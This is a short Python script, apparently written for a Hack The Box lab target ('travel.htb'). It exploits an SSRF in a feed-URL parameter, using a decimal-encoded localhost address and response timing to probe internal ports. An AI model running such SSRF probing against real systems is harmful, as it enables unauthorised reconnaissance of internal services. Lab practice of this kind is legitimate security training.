#!/usr/bin/env python3

# a quick check too see if we get any tminng difference doing a localhost SSRF.
import requests, time

for i in [80, 22, 443, 50, 90]:
    url = f'http://2130706433:{i}'
    start = time.time()
    res = requests.get(f'http://blog.travel.htb/awesome-rss/?custom_feed_url={url}')
    print(time.time() - start)
    print(len(res.text))
    print(i)
